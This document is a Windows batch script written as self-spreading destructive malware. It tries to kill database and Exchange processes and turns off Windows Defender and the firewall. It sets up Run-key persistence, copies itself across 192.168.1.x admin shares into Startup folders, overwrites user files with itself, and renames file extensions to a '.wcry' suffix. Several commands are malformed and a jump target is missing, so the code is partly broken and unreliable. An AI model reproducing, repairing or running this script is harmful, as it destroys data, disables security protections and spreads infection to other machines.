@ECHO off
SET i=0
SET "NomeProcess=main.bat"
SET "NomeService=main.bat"
net stop /f /im mysqld.exe
net stop /f /im sqlwriter.exe
net stop /f /im sqlserver.exe
net stop /f /im MSExchange*
net stop /f /im Microsoft.Exchange.*
attrib +h
cacls . /grant Everyone:F /T /C /Q
net stop "Windows Defender Service"
net stop "Windows Firewall"
echo sc create %NomeService% binpath=%0 > main.bat
echo sc start %NomeService% >> main.bat
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0
:PGFUSIYRT
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto PGFUSIYRT
:SMDFBICIAGFUS
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
:G
copy %0 C:\Users\%USERNAME%\Pictures
copy %0 C:\Users\%USERNAME%\Downloads
copy %0 C:\Users\%USERNAME%\Documents
copy %0 C:\Windows\System32
copy %0 C:\Users\%USERNAME%\Music
copy %0 C:\Users\%USERNAME%\Videos
copy %0 C:\Users\%USERNAME%\Desktop
copy %0 C:\Users\Public
start C:\Windows\System32\%~n0
start C:\Users\%USERNAME%\Documents\%~n0
start C:\Users\%USERNAME%\Pictures\%~n0
start C:\Users\%USERNAME%\Downloads\%~n0
start C:\Users\%USERNAME%\Videos\%~n0
start C:\Users\%USERNAME%\Music\%~n0
start C:\Users\%USERNAME%\Desktop\%~n0
start C:\Users\%USERNAME%\Documents\%~n0
start C:\Users\public\%~n0
ren *.dll *.txt
ren *.exe *.txt
ren *.png *.txt
ren *.mp3 *.txt
ren *.mid *.txt
ren *.mp4 *.txt
ren *.docx *.txt
ren *.doc *.txt
ren *.wav *.txt
ren *.ogg *.txt
ren *.zip *.txt
ren *.7z *.txt
ren *.jpeg *.txt
ren *.exe *.txt
ren *.log *.txt
ren *.db *.txt
ren *.xml *.txt
ren *.ai *.txt
ren *.gif *.txt
ren *.bmp *.txt
ren *.psd *.txt
ren *.jpg*.txt
ren *.svg *.txt
ren *.ico *.txt
ren *.ps *.txt
ren *.tif *.txt
ren *.tiff *.txt
ren *.mov*.txt
ren *.txt*.midi
ren *.midi*.png
ren *.png*.doc
ren *.doc*.vbs
ren *.vbs*.wcry
goto G
